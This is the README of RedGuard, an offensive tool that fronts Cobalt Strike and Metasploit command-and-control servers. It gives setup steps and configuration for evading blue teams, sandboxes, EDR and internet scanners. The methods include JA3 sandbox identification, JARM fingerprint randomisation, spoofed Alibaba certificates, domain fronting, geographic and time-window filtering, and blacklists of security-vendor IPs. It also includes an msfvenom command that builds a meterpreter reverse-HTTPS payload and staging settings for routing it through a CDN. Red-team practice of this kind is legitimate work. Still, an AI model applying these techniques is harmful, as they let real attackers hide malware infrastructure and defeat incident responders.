<h1 align="center">RedGuard - Excellent C2 Front Flow Control tool</h1>

[![GitHub stars](https://img.shields.io/github/stars/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu) [![GitHub issues](https://img.shields.io/github/issues/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/issues) [![GitHub release](https://img.shields.io/github/release/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/releases) [![](https://img.shields.io/badge/author-风起-blueviolet)](https://github.com/wikiZ)

--------------

English | [中文文档](https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md)

![1653117445(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/42d448a4cd030c05bacb8bde759b5d8.png)

# 0x00 Introduction

## What is RedGuard

RedGuard, a derivative tool based on command and control (C2) front flow control technology, has a lighter design, efficient traffic interaction, and reliable compatibility with development in the go programming language.As cyber attacks are constantly evolving , the red and blue team exercises become progressively more complex, RedGuard is designed to provide a better C2 channel hiding solution for the red team, that provides the flow control for the C2 channel, blocks the "malicious" analysis traffic, and better completes the entire attack task.

RedGuard is a C2 front flow control tool that can avoid Blue Team, AVS, EDR, Cyberspace Search Engine detects.

## When is RedGuard Used?

- In the offensive and defensive exercise, the investigators attempting to do cyber attribution analyze C2 traffic connected to the attackers with the situational awareness platform
- Prevent malware sample analysis by identifying cloud sandboxes based on JA3 fingerprint libraries
- Block malicious requests to perform replay attacks and achieve obfuscation online
- Restrict access requests by whitelisting in the case of the IP of the connecting server is specified
- Prevent the scanning and identification of C2 facilities by cyberspace mapping technology, and redirect or intercept the traffic of scanning probes
- Supports front flow control for multiple C2 servers, and can realize domain fronting, load balancing connection to achieve hidden effect
- Able to perform regional host connection restriction according to the attribution of IP address by requesting IP reverse lookup API interface
- Resolve strong features of staged checksum8 rule path parsing without changing the source code.
- Analyze blue team traceability behavior through interception logs of target requests, which can be used to track peer connection events/issues
- With the ability to customize the time period for legal interaction of samples to realize the function of only conducting traffic interaction during the working time period
- Malleable C2 Profile parser capable of validating inbound HTTP/S requests strictly against malleable profile and dropping outgoing packets in case of violation (supports Malleable Profiles 4.0+)
- Built-in blacklist of IPV4 addresses for a large number of devices, honeypots, and cloud sandboxes associated with  cybersecurity vendors to automatically intercept redirection request traffic
- SSL certificate information and redirect URLs that can interact with samples through custom tools to avoid the fixed signature of tool traffic
- ..........

# 0x01 Install

You can directly download and use the compiled version, or you can download the go package remotely for independent compilation and execution.

```bash
git clone https://github.com/wikiZ/RedGuard.git
cd RedGuard
# You can also use upx to compress the compiled file size
go build -ldflags "-s -w" -trimpath
# Give the tool executable permission and perform initialization operations
chmod +x ./RedGuard&&./RedGuard

```

# 0x02 Configuration Description

## initialization

As shown in the figure below, Set executable permissions and initialize RedGuard. The first run will generate a configuration file in the current user home directory to achieve flexible function configuration. Configuration file name: **.RedGuard_CobaltStrike.ini**.

![1653117707(1).png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656308555577.jpg)

**Configuration file content:**

![1653117707(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310498272.png)

The configuration options of cert are mainly for the configuration information of SSL certificate encrypted HTTPS communication between the sample and the C2 front infrastructure. The proxy is mainly used to configure the control options in the reverse proxy traffic. The specific use will be explained in detail below.

The SSL certificate encrypted HTTPS communication will be generated in the cert-rsa/ directory under the directory where RedGuard is executed. You can start and stop the basic functions of the tool by modifying the configuration file **(the serial number of the certificate is generated according to the timestamp , don't worry about being associated with this feature)**.If you want to use your own certificate,Just rename them to ca.crt and ca.key.

```bash
openssl x509 -in ca.crt -noout -text
```

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656308972417.jpg)

Random TLS JARM fingerprints are updated each time RedGuard is started to prevent this from being used to authenticate C2 infrastructure.

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/d2d8d30fcd349bd4567c685aaa93451.jpg)

In the case of using your own certificate, modify the HasCert parameter in the configuration file to `true` to prevent normal communication problems caused by the incompatibility of the CipherSuites encryption suite with the custom certificate caused by JARM obfuscation randomization.

```bash
# Whether to use the certificate you have applied for true/false
HasCert      = false
```

## RedGuard Parameters

```bash
root@VM-4-13-ubuntu:~# ./RedGuard -h

Usage of ./RedGuard:
  -DropAction string
        RedGuard interception action (default "redirect")
  -EdgeHost string
        Set Edge Host Communication Domain (default "*")
  -EdgeTarget string
        Set Edge Host Proxy Target (default "*")
  -HasCert string
        Whether to use the certificate you have applied for (default "true")
  -allowIP string
        Proxy Requests Allow IP (default "*")
  -allowLocation string
        Proxy Requests Allow Location (default "*")
  -allowTime string
        Proxy Requests Allow Time (default "*")
  -common string
        Cert CommonName (default "*.aliyun.com")
  -config string
        Set Config Path
  -country string
        Cert Country (default "CN")
  -dns string
        Cert DNSName
  -host string
        Set Proxy HostTarget
  -http string
        Set Proxy HTTP Port (default ":80")
  -https string
        Set Proxy HTTPS Port (default ":443")
  -ip string
        IPLookUP IP
  -locality string
        Cert Locality (default "HangZhou")
  -location string
        IPLookUP Location (default "风起")
  -malleable string
        Set Proxy Requests Filter Malleable File (default "*")
  -organization string
        Cert Organization (default "Alibaba (China) Technology Co., Ltd.")
  -redirect string
        Proxy redirect URL (default "https://360.net")
  -type string
        C2 Server Type (default "CobaltStrike")
  -u    Enable configuration file modification
  
```

**P.S. You can use the parameter command to modify the configuration file. Of course, I think it may be more convenient to modify it manually with vim.**

# 0x03 Tool usage

## basic interception

If you directly access the port of the reverse proxy, the interception rule will be triggered. Here you can see the root directory of the client request through the output log, but because the request does not carry the requested credentials that is the correct HOST request header, the basic interception rule is triggered, and the traffic is redirected to <https://360.net>

Here is just a demonstration of the output, the actual use can be run in the background through `nohup ./RedGuard &`.

![1653130661(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309416534.png)

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

It is not difficult to see from the above slice that 360.net is proxied to the local port 8080, 360.com is proxied to the local port 4433, and the HTTP protocol used is also different. In actual use, it is necessary to pay attention to the protocol type of the listener. Consistent with the settings here, and set the corresponding HOST request header.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309543334.jpg)

As shown in the figure above, in the case of unauthorized access, the response information we get is also the return information of the redirected site.

## interception method

In the above basic interception case, the default interception method is used, the illegal traffic is intercepted by redirection. By modifying the configuration file, we can change the interception method and the redirected site URL. In fact, rather than calling this a redirect, I think it might be more appropriate to describe it as hijacking, cloning, since the response status code returned is 200, and the response is obtained from another website to mimic the cloned/hijacked website as closely as possible.

Invalid packets can be incorrectly routed according to three strategies:

- **reset**: Disconnect the TCP connection immediately.
- **proxy**: Get a response from another website to mimic the cloned/hijacked website as closely as possible.
- **redirect**: redirect to the specified website and return HTTP status code 302, there is no requirement for the redirected website.

```bash
# RedGuard interception action: redirect / rest / proxy (Hijack HTTP Response)
drop_action   = proxy
# URL to redirect to
Redirect      = https://360.net
```

**Redirect = URL** in the configuration file points to the hijacked URL address. RedGuard supports "hot change", which means that while the tool is running in the background through `nohup`, we can still modify the configuration file. The content is started and stopped in real time.

```bash
./RedGuard -u --drop true
```

Note that when modifying the configuration file through the command line, The `-u` option should not be missing, otherwise the configuration file cannot be modified successfully. If you need to restore the default configuration file settings, you only need to enter `./RedGuard -u`.

Another interception method is DROP, which directly closes the HTTP communication response and is enabled by setting **DROP = true**. The specific interception effect is as follows:

![1653132755(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310664285.jpg)

It can be seen that the C2 front flow control directly close response to illegal requests without the HTTP response code. In the detection of cyberspace mapping, the DROP method can hide the opening of ports. The specific effect can be seen in the following case. analyze.

## Proxy port modification

The configuration of the following two parameters in the configuration file realizes the effect of changing the reverse proxy port. It is recommended to use the default port hiding as long as it does not conflict with the current server port. If it must be modified, then pay attention to the `:` of the parameter value not to be missing

```bash
# HTTPS Reverse proxy port
Port_HTTPS = :443
# HTTP Reverse proxy port
Port_HTTP = :80
```

## RedGuard logs

The blue team tracing behavior is analyzed through the interception log of the target request, which can be used to track peer connection events/issues. The log file is generated in the directory where RedGuard is running, **file name: RedGuard.log**.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310909975.jpg)

## RedGuard Obtain the real IP address

This section describes how to configure RG to obtain the real IP address of a request. You only need to add the following configuration to the profile of the C2 device, the real IP address of the target is obtained through the request header X-Forwarded-For.

```bash
http-config {
    set trust_x_forwarded_for "true";
}
```

## Request geographic restrictions

The configuration method takes `AllowLocation = Jinan, Beijing` as an example. Note that RedGuard provides two APIs for reverse IP attribution, one for users in mainland China and the other for users in non-mainland China, and can dynamically assign which API to use according to the input geographical domain name, if the target is China Then use Chinese for the set region, otherwise use English place names. It is recommended that users in mainland China use Chinese names, so that the accuracy of the attribution and the response speed of the API obtained by reverse query are the best choices.

P.S. Mainland Chinese users, do not use **AllowLocation = Jinan,beijing** this way! It doesn't make much sense, the first character of the parameter value determines which API to use!

```bash
# IP address owning restrictions example:AllowLocation = 山东，上海，杭州 or shanghai,beijing
AllowLocation = *
```

![1653134160(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311033506.jpg)

Before deciding to restrict the region, you can manually query the IP address by the following command.

```bash
./RedGuard --ip 111.14.218.206
./RedGuard --ip 111.14.218.206 --location shandong # Use overseas API to query
```

Here we set to allow only the Shandong region to go online

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521200158-d0d34d6c-d8fd-1.png)

**Legal traffic:**

![1653137496(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205147-c6bb200a-d904-1.png)

**Illegal request area:**

![1653137621(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205347-0dbc1efa-d905-1.png)

Regarding the connections of geographical restrictions, it may be more practical in the current offensive and defensive exercise. Basically, the targets of provincial and municipal offensive and defensive exercise restrictions are in designated areas, and the traffic requested by other areas can naturally be ignored. This function of RedGuard can not only limit a single region, but also limit multiple connection regions according to provinces and cities, and intercept the traffic requested by other regions.

## Blocking based on whitelist

In addition to the built-in IP blacklist of cybersecurity vendors in RedGuard, we can also restrict according to the whitelist method. In fact, I also suggest that during web penetration, we can restrict the online IP addresses according to the whitelist to split multiple way of IP address.

```bash
# Whitelist list example: AllowIP = 172.16.1.1,192.168.1.1
AllowIP       = 127.0.0.1
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311197849.png)

As shown in the figure above, we restrict to allow only 127.0.0.1 connections, then the request traffic of other IPs will be blocked.

## Block based on time period

This function is more interesting. Setting the following parameter values in the configuration file means that the traffic control facility can only connect from 8:00 am to 9:00 pm. The specific application scenario here is that during the specified attack time, we allow communication with C2, and remains silent at other times. This also allows the red teams to get a good night's sleep without worrying about some blue team on duty at night being bored to analyze your Trojan and then wake up to something indescribable, hahaha.

```bash
# Limit the time of requests example: AllowTime = 8:00 - 16:00
AllowTime     = 8:00 - 21：00
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311327769.png)

## Malleable Profile

RedGuard uses the Malleable C2 profile. It parses the provided extensible configuration file section to understand the contract and pass only those inbound requests that satisfy it, while misleading other requests. Parts such as `http-stager`, `http-get` and `http-post` and their corresponding uris, headers, User-Agent etc. are used to distinguish legal beacon requests from irrelevant Internet noise or IR/AV/EDR Out-of-bounds packet.

```bash
# C2 Malleable File Path
MalleableFile = /root/cobaltstrike/Malleable.profile
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311591693.png)

The profile written by 风起 is recommended to use:

> <https://github.com/wikiZ/CobaltStrike-Malleable-Profile>

# 0x04 Case Analysis

## Cyberspace Search Mapping

As shown in the figure below, when our interception rule is set to DROP, the spatial mapping system probe will probe the / directory of our reverse proxy port several times. In theory, the request packet sent by mapping is faked as normal traffic as shown. But after several attempts, because the signature of the request packet do not meet the release requirements of RedGuard, they are all responded by Close HTTP. The final effect displayed on the surveying and mapping platform is that the reverse proxy port is not open.

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656312184116.png)

The traffic shown in the figure below means that when the interception rule is set to Redirect, we will find that when the mapping probe receives a response, it will continue to scan our directory. User-Agent is random, which seems to be in line with normal traffic requests, but both successfully blocked.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656312557035.png)

**Mapping Platform - Hijack Response Intercept Mode Effect:**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656313188878.png)

**Surveying and mapping platform - effect of redirection interception:**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656406644535.jpg)

## Domain fronting

RedGuard supports Domain fronting. In my opinion, there are two forms of presentation. One is to use the traditional Domain fronting method, which can be achieved by setting the port of our reverse proxy in the site-wide acceleration back-to-origin address. On the original basis, the function of traffic control is added to the domain fronting, and it can be redirected to the specified URL according to the setting we set to make it look more real. It should be noted that the RedGuard setting of the HTTPS HOST header must be consistent with the domain name of the site-wide acceleration.

![1653201007(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143012-a26ab442-d998-1.png)

In single combat, I suggest that the above method can be used, and in team tasks, it can also be achieved by self-built "Domain fronting".

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143837-cf77a944-d999-1.png)

In the self-built Domain fronting, keep multiple reverse proxy ports consistent, and the HOST header consistently points to the real C2 server listening port of the backend. In this way, our real C2 server can be well hidden, and the server of the reverse proxy can only open the proxy port by configuring the firewall.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656313773114.jpg)

This can be achieved through multiple node servers, and configure multiple IPs of our nodes in the CS listener HTTPS online IP.

## Edge Node

RedGuard 22.08.03 updated the edge host conection settings - custom intranet host interaction domain name, and the edge host uses the domain front CDN node interaction. This makes the information asymmetry between the two hosts, making it more difficult to trace the source and make it difficult to troubleshoot.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/66b9e60fb8303b3c6b457cc8134a436.png)

## CobaltStrike

If there is a problem with the above method, the actual online C2 server cannot be directly intercepted by the firewall, because the actual load balancing request in the reverse proxy is made by the IP of the cloud server manufacturer.

In single combat, we can set an interception rules on the cloud server firewall.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150356-58b9586c-d99d-1.png)

Then set the address pointed to by the proxy to <https://127.0.0.1:4433>.

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

And because our basic verification is based on the HTTP HOST request header, what we see in the HTTP traffic is also the same as the domain fronting method, but the cost is lower, and only one cloud server is needed.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150942-26f6c264-d99e-1.png)

For the listener settings, the `HTTPS Port (C2)` is set to the RedGuard reverse proxy port, and the `HTTPS Port (Bind)` is the actual connection port of the local machine.

## Metasploit

**Generates Trojan**

```bash
$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com 
-f exe -o ~/path/to/payload.exe
```

Of course, as a domain fronting scenario, you can also configure your LHOST to use any domain name of the manufacturer's CDN, and pay attention to setting the HttpHostHeader to match RedGuard.

```bash
setg OverrideLHOST 360.com
setg OverrideLPORT 443
setg OverrideRequestHost true
```

It is important to note that the `OverrideRequestHost` setting must be set to `true`. This is due to a feature in the way Metasploit handles incoming HTTP/S requests by default when generating configuration for staging payloads. By default, Metasploit uses the incoming request's `Host` header value (if present) for second-stage configuration instead of the `LHOST` parameter. Therefore, the build stage is configured to send requests directly to your hidden domain name because CloudFront passes your internal domain in the `Host` header of forwarded requests. This is clearly not what we are asking for. Using the `OverrideRequestHost` configuration value, we can force Metasploit to ignore the incoming `Host` header and instead use the `LHOST` configuration value pointing to the origin CloudFront domain.

The listener is set to the actual line port that matches the address RedGuard actually forwards to.

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png)

RedGuard received the request:

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png)

# 0x05 Loading

Thank you for your support. RedGuard will continue to improve and update it. I hope that RedGuard can be known to more security practitioners. The tool refers to the design ideas of RedWarden.

**We welcome everyone to put forward your needs, RedGuard will continue to grow and improve in these needs!**

**About the developer 风起 related articles:<https://www.anquanke.com/member.html?memberId=148652>**

> 2022Kcon Author of the weapon spectrum of the hacker conference
>
> The 10th ISC Internet Security Conference Advanced Offensive and Defensive Forum "C2 Front Flow Control" topic
>
> <https://isc.n.cn/m/pages/live/index?channel_id=iscyY043&ncode=UR6KZ&room_id=1981905&server_id=785016&tab_id=253>
>
> Analysis of cloud sandbox flow identification technology
>
> <https://www.anquanke.com/post/id/277431>
>
> Realization of JARM Fingerprint Randomization Technology
>
> <https://www.anquanke.com/post/id/276546>

**Kunyu: <https://github.com/knownsec/Kunyu>**

> 风起于青萍之末，浪成于微澜之间。

# 0x06 Community

If you have any questions or requirements, you can submit an issue under the project, or contact the developer by adding WeChat.

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/20220522141706-ce37e178-d996-1.png)
